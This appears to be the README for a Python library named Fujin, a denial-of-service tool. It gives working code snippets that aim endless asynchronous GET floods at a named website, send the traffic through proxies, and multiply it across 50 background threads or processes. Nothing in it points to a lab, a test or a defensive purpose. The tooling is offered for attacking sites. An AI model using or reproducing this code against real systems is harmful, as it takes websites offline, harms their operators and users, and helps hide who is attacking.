# Documentation
Happy learnings

## Install

## Initialise Object
```
from Fujin import Fujin

url = "https://999root.xyz/"

headers = {
  "User-Agent": "fucking user agent",
  "Accept-Encoding": "gzip"
}

ddos = Fujin(url=url, header=headers)
```

## Run a simple Asynchronous DDoS
This will run an Infinite Loop Synchronous function that should infinitely send traffic to your selected website.
```
from Fujin import fujin

url = "https://999root.xyz/"

headers = {
  "User-Agent": "fucking user agent",
  "Accept-Encoding": "gzip"
}

ddos = Fujin(url=url, header=headers)
ddos.begin_async_get_attack()
```

## Use proxies
```
from Fujin import fujin

url = "https://999root.xyz/"

proxies = {
  "http": "http://[proxy]"
}

ddos = Fujin(url=url, proxies=proxies)
```

## Use threading or multiprocessing to speed up our DDoS
```
# Daemon = run in the background / threads = how many threads would you like to run
ddos.thread_async_attack(threads=50, daemon=True)
ddos.thread_sync_attack(threads=50, daemon=True)
```

```
ddos.multiproc_sync_attack(processes=50, daemon=True)
ddos.multiproc_async_attack(processes=50, daemon=True)
```

## What's faster sync or async
asnyc mate
